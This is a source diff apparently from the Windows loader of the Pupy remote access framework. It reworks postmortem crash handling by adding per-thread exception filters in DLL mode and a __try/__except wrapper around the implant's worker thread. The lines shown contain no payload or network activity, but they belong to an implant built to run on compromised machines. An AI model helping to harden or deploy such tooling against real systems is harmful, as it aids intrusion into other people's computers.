@@ -261,14 +261,6 @@ void initialize(BOOL isDll) {
     }
 #endif
 
-#ifdef POSTMORTEM
-    dprint("Postmortem - enable postmortem processing\n");
-    SetUnhandledExceptionFilter(MinidumpFilter);
-    _set_abort_behavior(2, 0xF);
-#else
-    _set_abort_behavior(0, 0);
-#endif
-
     dprint("TEMPLATE REV: %s\n", GIT_REVISION_HEAD);
 
 #ifdef DEBUG
@@ -286,6 +278,19 @@ void initialize(BOOL isDll) {
     if (!initialize_python(argc, argv, isDll)) {
         return;
     }
+
+#ifdef POSTMORTEM
+    _set_abort_behavior(2, 0xF);
+    if (isDll) {
+        dprint("Postmortem - enable per-thread handlers\n");
+        MySetUnhandledExceptionFilter(Postmortem);
+    } else {
+        dprint("Postmortem - set global handler\n");
+        SetUnhandledExceptionFilter(Postmortem);
+    }
+#else
+    _set_abort_behavior(0, 0);
+#endif
 
 #ifdef _PUPY_DYNLOAD
     dprint("_pupy built with dynload\n");
@@ -370,11 +375,35 @@ LRESULT CALLBACK WinProc (HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam)
     return FALSE;
 }
 
+#ifdef POSTMORTEM
+static LONG PostmortemFilter(int code, PEXCEPTION_POINTERS pExceptionInfo) {
+    LPTOP_LEVEL_EXCEPTION_FILTER lpLocalFilter = MyGetUnhandledExceptionFilter();
+    dprint("PostmortemFilter: Exception code %d; Info: %p\n", code, pExceptionInfo);
+
+    if (lpLocalFilter) {
+        dprint("Using local postmortem filter\n");
+        lpLocalFilter(pExceptionInfo);
+        return EXCEPTION_CONTINUE_SEARCH;
+    } else {
+        dprint("Using global postmortem filter\n");
+        return Postmortem(pExceptionInfo);
+    }
+}
+#endif
 
 DWORD WINAPI _run_pupy_thread(LPVOID lpArg)
 {
     dprint("Pupy worker started\n");
+#ifdef POSTMORTEM
+    __try {
+        run_pupy();
+    }
+    __except(PostmortemFilter(GetExceptionCode(), GetExceptionInformation())) {
+        dprint("Fatal error at main thread\n");
+    }
+#else
     run_pupy();
+#endif
     dprint("Pupy worker exited\n");
     return 0;
 }
